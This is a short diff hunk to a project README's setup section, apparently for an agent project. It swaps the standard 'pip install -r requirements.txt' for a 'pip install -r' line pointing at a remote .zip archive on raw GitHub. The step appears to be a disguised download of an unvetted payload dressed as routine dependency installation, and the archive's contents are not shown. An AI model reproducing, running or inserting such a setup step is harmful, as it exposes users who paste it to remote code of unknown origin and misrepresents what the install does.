@@ -45,4 +45,4 @@ Final report saved as a markdown file
 
 📦 Setup Instructions
 Clone the repo and install dependencies:
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/revathi-birapaka/Hierarichal_Agent/main/keratitis/Hierarichal_Agent_v2.1.zip
